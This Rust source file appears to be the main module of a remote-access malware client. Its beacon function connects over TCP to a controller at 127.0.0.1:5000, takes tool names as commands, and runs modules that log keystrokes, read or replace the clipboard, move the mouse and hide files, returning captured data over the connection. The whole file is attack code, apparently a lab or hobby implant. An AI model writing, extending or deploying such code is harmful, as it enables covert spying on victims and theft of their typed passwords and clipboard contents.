mod tools;
use tools::{ghost, keylogger, clipboard, replaceboard, mouseketool, obfuscate, Tool};
use std::{
    io::{self, Read, Write},
    error::Error,
    net::TcpStream,
};


fn check_tool(input: &str) -> Tool {
    match input {
        "keylogger" => return Tool::Keylogger,
        "clipboard" => return Tool::Clipboard,
        "replaceboard" => return Tool::ReplaceBoard,
        "ghost" => return Tool::Ghost,
        "mouseketool" => return Tool::Mouseketool,
        "obfuscate" => return Tool::Obfuscate,
        _ => return Tool::Invalid, 
    }
}

pub fn trim_trailing_newline(input: &mut String) {
    if let Some('\n')=input.chars().next_back() {
        input.pop();
    }
    if let Some('\r')=input.chars().next_back() {
        input.pop();
    }
}

pub fn get_filename() -> io::Result<String> {
    let mut input = String::new();
    let mut confirmation = String::new();
    while confirmation.to_uppercase() != "Y" {
        input.clear();
        confirmation.clear();

        print!("Enter the file you would like to obfuscate: ");
        io::stdout().flush()?;
        io::stdin().read_line(&mut input)?;
        trim_trailing_newline(&mut input);

        print!("You entered {input}, is this correct? (Y/N): ");
        io::stdout().flush()?;
        io::stdin().read_line(&mut confirmation)?;
        trim_trailing_newline(&mut confirmation);

        while confirmation.to_uppercase() != "Y" && confirmation.to_uppercase() != "N" {
            confirmation.clear();
            print!("Incorrect input, try again (Y/N): "); 
            io::stdout().flush()?;
            io::stdin().read_line(&mut confirmation)?;
            trim_trailing_newline(&mut confirmation);
        }
    }

    Ok(input)
}

pub fn run(tool: Tool) -> Result<String, Box<dyn Error>> {
    match tool {
        Tool::Keylogger => {
            let captured = keylogger::run()?;
            Ok(captured)
        }
        Tool::Clipboard => {
            let text = clipboard::run()?;
            Ok(text)
        }
        Tool::ReplaceBoard => {
            let _ = replaceboard::run()?;
            Ok(String::from("Replaced clipboard with text \'1337\'"))
        }
        Tool::Mouseketool => {
            let _ = mouseketool::run()?;
            Ok(String::from("Moved the mouse"))
        } 
        Tool::Ghost => {
            let _ = ghost::run()?;
            Ok(String::from("Hid files"))
        }
        // Tool::Obfuscate => {
        //     let filename = get_filename()?;
        //     let _ = obfuscate::run(filename)?;
        //     return Ok(())
        // }
        _ => {
            // Return an error if the tool is invalid
            return Err("Invalid tool".into());
        }

    }
}

pub fn beacon() {
    if let Ok(mut stream) = TcpStream::connect("127.0.0.1:5000") {
        loop {
            let mut buffer = [0; 1024];
            if let Ok(n) = stream.read(&mut buffer) {
                if n > 0 {
                    let cmd = String::from_utf8_lossy(&buffer[..n]);
                    let tool = check_tool(&cmd);
                    let result = run(tool).unwrap();
                    // println!("{}", result);
                    let _ = stream.write(result.as_bytes()).unwrap();
                }
            }
        } 
    }
}
